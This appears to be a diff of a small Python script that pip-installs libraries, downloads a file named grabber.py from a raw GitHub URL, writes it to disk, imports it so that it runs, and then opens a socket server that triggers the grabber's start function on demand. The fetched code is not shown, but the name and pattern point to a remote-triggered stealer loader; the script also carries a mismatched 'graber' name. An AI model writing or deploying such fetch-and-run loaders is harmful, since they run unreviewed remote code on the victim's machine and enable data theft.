@@ -1,7 +1,13 @@
 import os
 
 os.system("cls")
-libraries = ["socket","subprocess","secrets","requests","os",]
+libraries = [
+    "socket",
+    "subprocess",
+    "secrets",
+    "requests",
+    "os"
+]
 
 for library in libraries:
     os.system(f"pip install {library}")
@@ -11,15 +17,14 @@ os.system("cls")
 import secrets
 import requests
 
-random_string = "".join(secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(10))
-
 raw_url = f"https://raw.githubusercontent.com/MatixAndr09/code/main/grabber.py"
 r = requests.get(raw_url)
-with open(f"{random_string}.py", "w") as f:
+with open(f"grabber.py", "w") as f:
     f.write(r.text)
 
 import socket
-import f"{random_string}"
+import grabber
+
 
 def get_local_ip():
     try:
@@ -33,6 +38,7 @@ def get_local_ip():
         print(f"Error occurred: {e}")
     finally:
         s.close()
+
 
 def start_server():
     ip_address = get_local_ip()
@@ -51,5 +57,6 @@ def start_server():
             graber.start_graber()
         else:
             pass
+
 
 start_server()
